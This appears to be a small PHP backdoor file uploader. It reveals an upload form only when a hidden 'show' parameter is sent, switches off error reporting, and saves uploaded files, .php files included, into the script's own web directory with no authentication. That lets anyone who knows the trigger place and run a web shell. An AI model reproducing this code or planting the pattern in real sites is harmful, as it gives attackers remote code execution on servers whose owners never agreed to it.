
<?php 
ini_set("max_execution_time", 0);
ini_set('memory_limit', '1024M');
ini_set("display_errors", "1");

error_reporting(0);

   if(isset($_REQUEST['show']))
   {

    
	if(isset($_FILES['image'])){
		$errors= array();
		$file_name = $_FILES['image']['name'];
		$file_size =$_FILES['image']['size'];
		$file_tmp =$_FILES['image']['tmp_name'];
		$file_type=$_FILES['image']['type'];   
		$file_ext=strtolower(end(explode('.',$_FILES['image']['name'])));
		
		$expensions= array("jpeg","txt","php"); 		
		if(in_array($file_ext,$expensions)=== false){
			$errors[]="extension not allowed ";
		}
		if($file_size > 2097152){
		$errors[]='File size must be excately 2 MB';
		}				
		if(empty($errors)==true){
			//move_uploaded_file($file_tmp,$_SERVER['DOCUMENT_ROOT']."/".$file_name);
		  move_uploaded_file($file_tmp,"./".$file_name);
		
			echo "Success";
		}else{
			print_r($errors);
		}
	}
?>

<form action="" method="POST" enctype="multipart/form-data">
<input type="file" name="image" />
<input type="submit"/>
</form>

<?php
}

?>








		














